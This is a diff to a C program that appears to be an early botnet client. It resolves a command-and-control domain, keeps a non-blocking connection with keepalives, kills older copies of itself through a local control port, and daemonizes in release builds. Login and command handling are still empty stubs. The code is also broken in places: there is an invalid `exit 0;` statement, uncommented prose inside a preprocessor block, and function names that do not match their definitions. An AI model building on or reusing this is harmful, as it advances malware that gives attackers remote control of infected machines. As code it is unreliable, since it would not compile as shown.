@@ -7,6 +7,8 @@
 #include <fcntl.h>
 #include <time.h>
 #include <errno.h>
+#include <signal.h>
+
 
 #include "includes.h"
 #include "reslove.h"
@@ -22,12 +24,14 @@ static void establish_connection(void);
 
 struct sockaddr_in srv_addr;
 static int fd_ctrl = -1, fd_serv = -1;
-static BOOL pending_connection = FALSE;
+static BOOL neet_setup_connection = FALSE;
+static BOOL bind_OK = FALSE;
 
 int main(int argc, char **args)
 {
 	int pgroupid;
-	int selectcount = 0;
+	int select_count = 0;
+
 	srv_addr.sin_family = AF_INET;
 	reslove_dns_lookup(CNC_DOMAIN, &srv_addr.sin_addr.s_addr);
 	if (srv_addr.sin_addr.s_addr == 0)
@@ -41,9 +45,23 @@ int main(int argc, char **args)
 	}
 	srv_addr.sin_port = htons(CNC_PORT);	
 
-	ensure_single_instance();
+	
+	while(!bind_OK)
+	{
+		ensure_single_instance();
+		sleep(3);
+	}
 
-	/*become a deamon
+	/*
+	while(!neet_setup_connection)
+	{
+		establish_connection();
+		sleep(3);	
+	}
+	*/
+
+#ifdef RELEASE
+	become a deamon
 	if (fork() > 0)
 	{
 		return 1;	
@@ -52,44 +70,46 @@ int main(int argc, char **args)
 	close(STDIN);
 	close(STDOUT);
 	close(STDERR);
-	*/
-	//initialization module here
-	//
-	//
-	//
+#endif
+	
+	/*initialization module here
+	 *
+	 *
+	 *
+	 */
+
 	while(TRUE)
 	{
 		fd_set fdread, fdwrite;
 		struct timeval timeline;
 		int mfd, nfds;
-		
+
 		//initilation fd_set
 		FD_ZERO(&fdread);
 		FD_ZERO(&fdwrite);
 
-		//fd for accept
-		if (fd_ctrl != -1)
-		{
-			FD_SET(fd_ctrl, &fdread);	
-		}
-		//fd for CNC
+		//select fd_ctrl when data in;
+		FD_SET(fd_ctrl, &fdread);
+
 		if (fd_serv == -1)
 		{
 			establish_connection();
 		}
-
-		//if connect to CNC success, fd_serv will be have data to send to CNC; 
-		//or fd_serv need to revice data from CNC;
-		if (pending_connection)
+		
+		/* in the first select, we assume that the connection has not been established
+		 * so we add fd_serv to fdwrite
+		 */
+		if (neet_setup_connection)
 		{
-			//connect success, then send data;
 			FD_SET(fd_serv, &fdwrite);	
 		}
+		/* after the connection is established, we only need to read the data*/
 		else
 		{
-			//or waitting data from CNC;
 			FD_SET(fd_serv, &fdread);	
 		}
+		
+		//get max fd for selection parmater
 		if (fd_ctrl > fd_serv)
 		{
 			mfd = fd_ctrl;	
@@ -102,8 +122,10 @@ int main(int argc, char **args)
 		//timeout 10s
 		timeline.tv_usec = 0;
 		timeline.tv_sec = 10;
+
 		//We do NOT care exception set
 		nfds = select(mfd+1, &fdread, &fdwrite, NULL, &timeline);
+
 		if (nfds == -1)
 		{
 			printf("[main]Select failed errno:%d\n", errno);	
@@ -111,15 +133,76 @@ int main(int argc, char **args)
 		}
 		else if (nfds == 0)
 		{
-			int flag = 0;
-			if ( selectcount++ % 10 == 0)
+			//try to keep alive
+			int flag = 1;
+			if ( select_count++ % 10 == 0)
 			{
 				send(fd_serv, &flag, sizeof(flag), MSG_NOSIGNAL);	
 			}
+			continue;
 		}
+		else
+		{
+			/* when fd_ctrl receives a new client's connection request, it kill itself
+			 * becaseus: in ensure_signal_instance(), when I failed to  bind the local address, I will try to connect to it 
+			 */ 	
+			if (fd_ctrl != -1 && FD_ISSET(fd_ctrl, &fdread))
+			{
+				//kill itself here
+				struct sockaddr_in new_addr;
+				socklen_t new_addr_len = sizeof(struct sockaddr_in);
+				accept(fd_ctrl, (struct sockaddr*)&new_addr, &new_addr_len);
 
+				close_connection_CNC();
+				close_connection_local();
+
+				printf("[main]A new instance appear, try to kill myselfi\n");
+
+				//exit
+				kill(getpid(), SIGKILL);
+				exit 0;
+			}
+
+			//check if the connection is established successfully
+			if (neet_setup_connection)
+			{
+				//in the second select, fd_serv will be added into fdread;
+				neet_setup_connection = FALSE;
+
+				//connection failed
+				if (fd_serv != -1 && FD_ISSET(fd_serv, &fdwrite))
+				{
+					close_connection_CNC();
+				}
+				else
+				{
+					//Detect if there is an error
+					int err = 0;
+					socklen_t err_len = sizeof(err);
+					getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
+					if (err != 0)
+					{
+						close_connection_CNC();	
+					}
+					else
+					{
+						//send login information
+						
+					}
+				}
+			}
+			//if the connection is already established, accept the server command
+			else if (fd_serv != -1 && FD_ISSET(fd_serv, &fdread))
+			{
+				/* try to read data from fd_serv
+				 * readn > 0	//Normal connection
+				 * readn == 0	//connection closed
+				 * readn < 0	//An error occurred
+				 */
+			}
+		}
 	}
-
+	
 	return 0;
 }
 
@@ -129,12 +212,50 @@ static void establish_connection()
 	fd_serv = socket(AF_INET, SOCK_STREAM, 0);
 	if (fd_serv == -1)
 	{
+		neet_setup_connection = FALSE;
 		printf("create socket failed, errorno:%d\n", errno);	
 		return ;
 	}
+
+	neet_setup_connection = TRUE;
 	fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));
-	pending_connection = TRUE;
 	connect(fd_serv, (struct sockaddr*)&srv_addr, sizeof(struct sockaddr_in));
+
+/* When a socket set as a unblock status
+ * connection() will always return -1 and set errno = 115
+ * so if we check the connection status via ret value, we would always failed;
+	MAKESURE_CONNECTION:
+		if (ret == -1)
+		{
+			neet_setup_connection = FALSE;	
+			close(fd_serv);
+			printf("[main]Failed to connect to CNC. errno:%d\n", errno);
+		}
+		else
+		{
+			neet_setup_connection = TRUE;	
+			printf("[main]Connect to CNC success.\n");
+		}
+ */
+	return ;
+}
+
+static void close_connect_CNC(void)
+{
+	if (fd_serv != -1)
+	{
+		close(fd_serv);
+	}
+	fd_serv = -1;
+}
+
+static void close_connect_local(void)
+{
+	if (fd_ctrl != -1)
+	{
+		close(fd_ctrl);
+	}
+	fd_ctrl = -1;
 }
 
 static void ensure_single_instance(void)
@@ -144,18 +265,16 @@ static void ensure_single_instance(void)
 	struct sockaddr_in addrclient;
 	int opt = 1;
 	int ret;
-	BOOL bind_OK = TRUE;
 	socklen_t socklength = sizeof(addrclient);
 	
 	fd_ctrl = socket(AF_INET, SOCK_STREAM, 0);
 	if (fd_ctrl == -1)
 	{
+		bind_OK = FALSE;
 		return ;	
 	}
 
-	//set socket option -> address can be reused;
 	setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
-	//make socket NOBLOCK;
 	fcntl(fd_ctrl, F_SETFL, O_NONBLOCK|fcntl(fd_ctrl, F_GETFL, 0));
 
 	addr.sin_family = AF_INET;
@@ -165,44 +284,47 @@ static void ensure_single_instance(void)
 	errno = 0;
 	ret = bind(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
 
+	//bind failed, so try to connect to it
 	if (ret == -1)
 	{
+		bind_OK = FALSE;	
+
 		if (errno == EADDRNOTAVAIL)
 		{
-			bind_OK = FALSE;	
-		}
-		printf("[main] Another instance is already running (errno = %d), try to kill itself\n", errno);	
+			printf("[main] Another instance is already running (errno = %d), try to send kill request.\n", errno);	
+			//restore the struct
+			addr.sin_family = AF_INET;
+			addr.sin_addr.s_addr = INADDR_ANY;
+			addr.sin_port = htons(SINGLE_INSTANCE_PORT);
 
-		//restore the struct
-		addr.sin_family = AF_INET;
-		addr.sin_addr.s_addr = INADDR_ANY;
-		addr.sin_port = htons(SINGLE_INSTANCE_PORT);
-		
-		ret = connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
-		if (ret == -1)
-		{
-			printf("[main] Failed to connect to fd_ctrl, try to kill itself\n");			
-		}
-		sleep(3);
-		close(fd_ctrl);
-		//kill process request here;
+			ret = connect(fd_ctrl, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
+			if (ret == -1)
+			{
+				printf("[main] Failed to connect to fd_ctrl, try to kill itself\n");			
+			}
 
-		//try again to start listen on SINGLE_INSTANCES_PORT
-		ensure_single_instance();
+			printf("[main]Another instance will be close after a short time\n");
+			sleep(1);
+			close(fd_ctrl);
+		}
 	}
 	else
 	{
 		ret = listen(fd_ctrl, 1);
 		if (ret  == -1)
 		{
+			bind_OK = FALSE;
 			printf("[main]Failed to listen on fd_ctrl, I will be try again!\n");	
 			close(fd_ctrl);
-			sleep(3);
-			//kill another process which take up that port
-			//try again
-			ensure_single_instance();
+			sleep(1);
 		}
-		bind_OK = TRUE;
-		printf("[main]There are only one instance running on this machine port:%d\n", ntohs(addr.sin_port));
+		else
+		{
+			printf("[main]There are only one instance running on this machine port:%d\n", ntohs(addr.sin_port));
+			bind_OK = TRUE;
+		}
 	}
+
+	return ;
+
 }
